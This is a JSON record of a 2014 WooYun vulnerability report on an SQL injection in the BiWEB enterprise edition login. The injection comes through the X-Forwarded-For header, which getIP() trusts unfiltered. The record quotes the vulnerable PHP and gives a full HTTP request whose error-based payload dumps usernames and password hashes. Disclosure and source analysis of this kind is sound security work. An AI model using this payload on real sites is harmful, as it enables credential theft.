{"id": 43720, "wybug_id": "wooyun-2014-081921", "wybug_title": "BiWEB最新企业版XFF注入一枚", "wybug_corp": "BiWEB", "wybug_author": "路人甲", "wybug_date": "2014-11-06 16:13", "wybug_open_date": "2015-02-04 16:14", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "注射漏洞利用技巧", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-06：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-02-04：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： BiWEB最新企业版XFF注入一枚 详细说明：  看到pandas提交的BiWEB的漏洞 WooYun: BIWEB企业版多处SQL注入 ，pandas在search.php里找到了几个注入漏洞，我也来凑下热闹。去官网下BiWEB企业版最新的5.8.6来看看。看看用户登录处是怎么处理的。BiWEB首先对GET和POST进行了过滤，/config/filtrate.inc.php\n<?php//过滤GET或POST的值，去除两端空格和转义符号if ($_SERVER['REQUEST_METHOD'] == 'POST'){\tcheck::filtrateData($_POST,$arrGPdoDB['htmlspecialchars']);}elseif($_SERVER['REQUEST_METHOD'] == 'GET'){\tcheck::filtrateData($_GET,$arrGPdoDB['htmlspecialchars']);}?>\n这里就先不说这种过滤的脑残之处了。继续往下看，判断用户是否可以正常登录的文件/mcenter/class/mcenter.class.php，若登录成功，则执行下面的代码（测试时请先注册一个用户）。\n无关代码if($arr){\t\t\tif(is_array($_SESSION)) $_SESSION = array_merge($_SESSION,$arr);\t\t\telse $_SESSION = $arr;\t\t\t$arrUpdate = array();\t\t\t$arrUpdate['user_ip'] = check::getIP();\t\t\t$arrUpdate['lastlog'] = date('Y-m-d H:i:s');\t\t\t$arrUpdate['user_id'] = $arr['user_id'];\t\t\t$arrUpdate['logtimes'] = ++$arr['logtimes'];\t\t\t$arrUpdate['session_id'] = session_id();\t\t\t$this->updateUser($arrUpdate);\t\t\treturn 1;\t\t}else{\t\t\tif($isAlert) check::AlertExit(\"用户名或密码错误\",-1);\t\t\telse return 0;\t\t}无关代码\n可以看到，上面代码中有这么一句$arrUpdate['user_ip'] = check::getIP();，然后没有过滤就直接执行SQL了。现在去看看ip是怎么获得的。/web_common5.8/check.class.php\nstatic function getIP() {        $ip = '';        if ($_SERVER[\"HTTP_CLIENT_IP\"]) $ip = $_SERVER[\"HTTP_CLIENT_IP\"];        else if($_SERVER[\"HTTP_X_FORWARDED_FOR\"])\t$ip = $_SERVER[\"HTTP_X_FORWARDED_FOR\"];        else if($_SERVER[\"REMOTE_ADDR\"]) $ip =$_SERVER[\"REMOTE_ADDR\"];        else $ip = \"Unknow\";        return $ip;}\n到这里就知道有问题了，登录，抓包，使用X-FROWARDED-FOR带入注入语句，成功注入。Payload:\nPOST /user/login.php HTTP/1.1Host: 192.168.0.107User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:33.0) Gecko/20100101 Firefox/33.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh,zh-cn;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://192.168.0.107/user/login.phpx-forwarded-for:1' or  (select 1 from (select count(*),concat(0x23,(select concat(user_name,0x23,password)from biweb_mcenter limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or'Cookie: AJSTAT_ok_times=8; bdshare_firstime=1414502402741; ypsdffp2app_admininfo=88ff7944laVfYY9BL1FuA%2BbNLMa%2Brd04KKHHyTrxgcY0sufkNR1I4pXCpZqYgYd9Y%2BqfL%2B4XwwN8WETv4bcEbqKo28CQBBbS0iWJDNmoWbq4y1I; PHPSESSID=sdaar3bonn3fma2h5hmdet4pe5Connection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 36User=admin&Pass=admin&authCode=muran\n成功注入\n\n   漏洞证明：  见 详细说明   修复方案：  执行SQL前过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}